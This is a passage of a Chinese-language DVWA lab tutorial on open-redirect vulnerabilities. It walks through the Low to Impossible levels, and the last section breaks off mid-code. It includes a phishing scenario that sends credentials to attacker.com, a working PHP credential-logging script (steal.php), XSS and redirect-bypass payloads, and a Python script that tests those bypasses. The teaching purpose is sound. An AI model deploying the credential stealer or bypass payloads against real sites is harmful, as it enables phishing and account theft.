+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>dvwa.local<span class="regexp">/vulnerabilities/</span>redirect<span class="regexp">/?redirect=https:/</span><span class="regexp">/evil.com/</span>fake-login.html</span><br><span class="line"></span><br><span class="line">用户点击后：</span><br><span class="line"><span class="number">1</span>. 看到来自dvwa.local的链接（信任）</span><br><span class="line"><span class="number">2</span>. 自动跳转到evil.com</span><br><span class="line"><span class="number">3</span>. 看到伪造的登录页面</span><br><span class="line"><span class="number">4</span>. 输入凭证</span><br><span class="line"><span class="number">5</span>. 凭证被发送到attacker.com/steal.php</span><br></pre></td></tr></table></figure>
+
+<p><strong>steal.php（窃取凭证）：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 记录窃取的凭证</span></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$log</span> = <span class="string">&quot;<span class="subst">$time</span> - IP: <span class="subst">$ip</span> - User: <span class="subst">$username</span> - Pass: <span class="subst">$password</span>\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;stolen_credentials.txt&#x27;</span>, <span class="variable">$log</span>, FILE_APPEND);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重定向回真实网站（隐蔽）</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: https://dvwa.local/login.php?error=invalid&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤3：使用JavaScript协议"><a href="#步骤3：使用JavaScript协议" class="headerlink" title="步骤3：使用JavaScript协议"></a>步骤3：使用JavaScript协议</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=javascript:<span class="built_in">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><br><span class="line"></span><br><span class="line">某些浏览器可能执行JavaScript（虽然现代浏览器有防护）</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤4：绕过简单的协议检查"><a href="#步骤4：绕过简单的协议检查" class="headerlink" title="步骤4：绕过简单的协议检查"></a>步骤4：绕过简单的协议检查</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">如果代码只检查http/https：</span><br><span class="line"></span><br><span class="line">?<span class="attribute">redirect</span>=//evil.com</span><br><span class="line">→ 协议相对URL，使用当前协议</span><br><span class="line"></span><br><span class="line">?<span class="attribute">redirect</span>=https:evil.com</span><br><span class="line">→ 某些解析器可能误判</span><br><span class="line"></span><br><span class="line">?<span class="attribute">redirect</span>=HtTpS://evil.com</span><br><span class="line">→ 大小写混淆</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤5：结合XSS攻击"><a href="#步骤5：结合XSS攻击" class="headerlink" title="步骤5：结合XSS攻击"></a>步骤5：结合XSS攻击</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 如果重定向参数也被输出到页面 --&gt;</span></span><br><span class="line">?redirect=&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">可能导致XSS + 重定向组合攻击</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Medium-难度"><a href="#Medium-难度" class="headerlink" title="Medium 难度"></a>Medium 难度</h2><h3 id="攻击目标-1"><a href="#攻击目标-1" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>简单的域名过滤，但可以绕过。</p>
+<h3 id="后端代码分析-1"><a href="#后端代码分析-1" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$redirect</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 新增：简单的域名检查 ★★★</span></span><br><span class="line">    <span class="comment">// 使用正则表达式检查URL</span></span><br><span class="line">    <span class="comment">// preg_match() - 正则匹配函数</span></span><br><span class="line">    <span class="comment">// 参数1：正则表达式</span></span><br><span class="line">    <span class="comment">// 参数2：要匹配的字符串</span></span><br><span class="line">    <span class="comment">// 返回值：1匹配，0不匹配</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 正则：/http[s]?:\/\/example\.com/i</span></span><br><span class="line">    <span class="comment">// 分解：</span></span><br><span class="line">    <span class="comment">// http[s]? - http或https</span></span><br><span class="line">    <span class="comment">// :\/\/ - ://</span></span><br><span class="line">    <span class="comment">// example\.com - 域名</span></span><br><span class="line">    <span class="comment">// i - 不区分大小写</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 只检查是否&quot;包含&quot;域名，不是完整匹配</span></span><br><span class="line">    <span class="comment">// 2. evil.com/page?url=http://example.com 会通过</span></span><br><span class="line">    <span class="comment">// 3. http://example.com.evil.com 会通过</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">preg_match</span>( <span class="string">&quot;/http[s]?:\/\/example\.com/i&quot;</span>, <span class="variable">$redirect</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 包含example.com，允许重定向</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect</span> );</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不包含example.com，拒绝</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid redirect URL&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护"><a href="#新增防护" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>正则检查</strong> - 检查URL是否包含合法域名</li>
+<li><strong>协议限制</strong> - 只允许http&#x2F;https</li>
+</ol>
+<h3 id="仍存在的漏洞"><a href="#仍存在的漏洞" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>核心问题：正则表达式使用不当</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 错误的正则：只要包含example.com就通过</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http[s]?:\/\/example\.com/i&quot;</span>, <span class="variable">$url</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以绕过的URL：</span></span><br><span class="line"><span class="string">&quot;http://evil.com?fake=http://example.com&quot;</span></span><br><span class="line"><span class="string">&quot;http://example.com.evil.com&quot;</span></span><br><span class="line"><span class="string">&quot;http://evil.com#http://example.com&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：域名后缀绕过"><a href="#方法1：域名后缀绕过" class="headerlink" title="方法1：域名后缀绕过"></a>方法1：域名后缀绕过</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">注册域名：example.<span class="keyword">com</span>.evil.<span class="keyword">com</span></span><br><span class="line"></span><br><span class="line">URL: ?redirect=http://example.<span class="keyword">com</span>.evil.<span class="keyword">com</span></span><br><span class="line"></span><br><span class="line">正则检查：</span><br><span class="line">/http[s]?:\/\/example\.<span class="keyword">com</span>/i 匹配到 <span class="string">&quot;http://example.com&quot;</span></span><br><span class="line">→ 通过检查</span><br><span class="line"></span><br><span class="line">实际重定向：http://example.<span class="keyword">com</span>.evil.<span class="keyword">com</span>（恶意网站）</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：使用-符号"><a href="#方法2：使用-符号" class="headerlink" title="方法2：使用@符号"></a>方法2：使用@符号</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=http:<span class="regexp">//</span>example.com@evil.com</span><br><span class="line"></span><br><span class="line">解析：</span><br><span class="line">正则看到：http:<span class="regexp">//</span>example.com</span><br><span class="line">浏览器解析：http:<span class="regexp">//</span>evil.com (example.com被当作用户名)</span><br><span class="line"></span><br><span class="line">结果：重定向到evil.com</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：URL参数绕过"><a href="#方法3：URL参数绕过" class="headerlink" title="方法3：URL参数绕过"></a>方法3：URL参数绕过</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=http:<span class="regexp">//</span>evil.com?ref=http:<span class="regexp">//</span>example.com</span><br><span class="line"></span><br><span class="line">正则检查：包含<span class="string">&quot;http://example.com&quot;</span> → 通过</span><br><span class="line">实际重定向：http:<span class="regexp">//</span>evil.com</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法4：Fragment绕过"><a href="#方法4：Fragment绕过" class="headerlink" title="方法4：Fragment绕过"></a>方法4：Fragment绕过</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=http:<span class="regexp">//</span>evil.com<span class="comment">#http://example.com</span></span><br><span class="line"></span><br><span class="line">正则检查：包含<span class="string">&quot;http://example.com&quot;</span> → 通过</span><br><span class="line">实际重定向：http:<span class="regexp">//</span>evil.com（<span class="comment">#后面是fragment，不影响域名）</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方法5：URL编码绕过"><a href="#方法5：URL编码绕过" class="headerlink" title="方法5：URL编码绕过"></a>方法5：URL编码绕过</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=http:<span class="regexp">//</span>evil.com%<span class="number">3</span>Furl%<span class="number">3</span>Dhttp:<span class="regexp">//</span>example.com</span><br><span class="line"></span><br><span class="line">解码后：http:<span class="regexp">//</span>evil.com?url=http:<span class="regexp">//</span>example.com</span><br><span class="line">正则检查：通过</span><br><span class="line">实际重定向：evil.com</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="High-难度"><a href="#High-难度" class="headerlink" title="High 难度"></a>High 难度</h2><h3 id="攻击目标-2"><a href="#攻击目标-2" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>更严格的域名检查，但仍有绕过可能。</p>
+<h3 id="后端代码分析-2"><a href="#后端代码分析-2" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$redirect</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：使用parse_url()解析URL ★★★</span></span><br><span class="line">    <span class="comment">// parse_url() - 解析URL，返回各个组成部分</span></span><br><span class="line">    <span class="comment">// 返回数组：</span></span><br><span class="line">    <span class="comment">// [&#x27;scheme&#x27;] =&gt; &#x27;https&#x27;</span></span><br><span class="line">    <span class="comment">// [&#x27;host&#x27;] =&gt; &#x27;example.com&#x27;</span></span><br><span class="line">    <span class="comment">// [&#x27;path&#x27;] =&gt; &#x27;/page&#x27;</span></span><br><span class="line">    <span class="comment">// [&#x27;query&#x27;] =&gt; &#x27;param=value&#x27;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 这比正则更可靠</span></span><br><span class="line">    <span class="variable">$parsed_url</span> = <span class="title function_ invoke__">parse_url</span>( <span class="variable">$redirect</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 检查是否成功解析 ★★★</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$parsed_url</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid URL format&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进：检查host字段 ★★★</span></span><br><span class="line">    <span class="comment">// 只允许特定域名</span></span><br><span class="line">    <span class="variable">$allowed_hosts</span> = [</span><br><span class="line">        <span class="string">&#x27;example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;www.example.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;subdomain.example.com&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$host</span> = <span class="variable">$parsed_url</span>[<span class="string">&#x27;host&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 检查host是否在白名单中 ★★★</span></span><br><span class="line">    <span class="comment">// in_array() - 检查数组中是否存在某值</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">in_array</span>( <span class="variable">$host</span>, <span class="variable">$allowed_hosts</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 域名在白名单中，允许重定向</span></span><br><span class="line">        <span class="title function_ invoke__">header</span>( <span class="string">&quot;Location: &quot;</span> . <span class="variable">$redirect</span> );</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 问题：错误信息可能泄露白名单 ★★★</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid host: <span class="subst">$host</span>. Allowed: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$allowed_hosts</span>) . <span class="string">&quot;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="新增防护-1"><a href="#新增防护-1" class="headerlink" title="新增防护"></a>新增防护</h3><ol>
+<li><strong>parse_url()解析</strong> - 正确解析URL结构</li>
+<li><strong>白名单检查</strong> - 只允许特定域名</li>
+<li><strong>检查host字段</strong> - 验证域名部分</li>
+</ol>
+<h3 id="仍存在的漏洞-1"><a href="#仍存在的漏洞-1" class="headerlink" title="仍存在的漏洞"></a>仍存在的漏洞</h3><p><strong>可能的绕过：</strong></p>
+<ol>
+<li><strong>URL解析差异</strong> - 不同解析器对URL的理解不同</li>
+<li><strong>协议相对URL</strong> - &#x2F;&#x2F;example.com</li>
+<li><strong>端口号绕过</strong> - example.com:80</li>
+<li><strong>IPv6绕过</strong> - [::1]</li>
+</ol>
+<h3 id="绕过方法-1"><a href="#绕过方法-1" class="headerlink" title="绕过方法"></a>绕过方法</h3><h4 id="方法1：利用解析器差异"><a href="#方法1：利用解析器差异" class="headerlink" title="方法1：利用解析器差异"></a>方法1：利用解析器差异</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">某些情况下，<span class="built_in">parse_url</span>()和浏览器解析URL的方式不同</span><br><span class="line"></span><br><span class="line">URL: http:<span class="comment">//example.com\@evil.com</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">parse_url</span><span class="params">()</span></span>可能认为：</span><br><span class="line">host = <span class="string">&quot;example.com&quot;</span></span><br><span class="line"></span><br><span class="line">但浏览器可能认为：</span><br><span class="line">host = <span class="string">&quot;evil.com&quot;</span></span><br><span class="line"></span><br><span class="line">结果：检查通过，但重定向到evil.com</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法2：协议相对URL"><a href="#方法2：协议相对URL" class="headerlink" title="方法2：协议相对URL"></a>方法2：协议相对URL</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果允许的白名单没有检查协议：</span><br><span class="line"></span><br><span class="line">URL: ?redirect=<span class="regexp">//</span>evil.com</span><br><span class="line"></span><br><span class="line">某些配置下可能绕过检查</span><br></pre></td></tr></table></figure>
+
+<h4 id="方法3：端口绕过"><a href="#方法3：端口绕过" class="headerlink" title="方法3：端口绕过"></a>方法3：端口绕过</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">URL: ?redirect=http:<span class="regexp">//</span>example.com:<span class="number">8080</span>@evil.com</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line">URL: ?redirect=http:<span class="regexp">//</span>example.com%<span class="number">2</span>f.evil.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>实际测试：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://dvwa.local/vulnerabilities/redirect/&quot;</span></span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;security&#x27;</span>: <span class="string">&#x27;high&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;your_session&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试各种绕过payload</span></span><br><span class="line">payloads = [</span><br><span class="line">    <span class="string">&quot;http://example.com@evil.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://example.com\\@evil.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://example.com%2f.evil.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;//evil.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://example.com:80@evil.com&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> payload <span class="keyword">in</span> payloads:</span><br><span class="line">    params = &#123;<span class="string">&#x27;redirect&#x27;</span>: payload&#125;</span><br><span class="line">    response = requests.get(url, params=params, cookies=cookies, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">302</span>:</span><br><span class="line">        location = response.headers.get(<span class="string">&#x27;Location&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] Payload worked: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;    Redirects to: <span class="subst">&#123;location&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Payload blocked: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Impossible-难度"><a href="#Impossible-难度" class="headerlink" title="Impossible 难度"></a>Impossible 难度</h2><h3 id="攻击目标-3"><a href="#攻击目标-3" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>完善的URL验证，真正安全。</p>
+<h3 id="后端代码分析-3"><a href="#后端代码分析-3" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 改进1：验证Anti-CSRF token ★★★</span></span><br><span class="line">    <span class="title function_ invoke__">checkToken</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$redirect</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;redirect&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护1：严格的白名单 ★★★</span></span><br><span class="line">    <span class="comment">// 定义允许的重定向URL（相对路径或绝对路径）</span></span><br><span class="line">    <span class="variable">$allowed_redirects</span> = [</span><br><span class="line">        <span class="string">&#x27;success.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;dashboard.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/vulnerabilities/redirect/success.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;https://www.example.com/success&#x27;</span></span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心防护2：完全匹配，不是包含 ★★★</span></span><br><span class="line">    <span class="comment">// in_array() - 严格检查</span></span><br><span class="line">    <span class="comment">// 参数3：true表示严格比较（类型和值都要相等）</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="title function_ invoke__">in_array</span>( <span class="variable">$redirect</span>, <span class="variable">$allowed_redirects</span>, <span class="literal">true</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 额外检查：如果是绝对URL，验证协议和域名 ★★★</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="title function_ invoke__">strpos</span>( <span class="variable">$redirect</span>, <span class="string">&#x27;http&#x27;</span> ) === <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="comment">// 解析URL</span></span><br><span class="line">            <span class="variable">$parsed</span> = <span class="title function_ invoke__">parse_url</span>( <span class="variable">$redirect</span> );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>( !<span class="variable">$parsed</span> ) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid URL 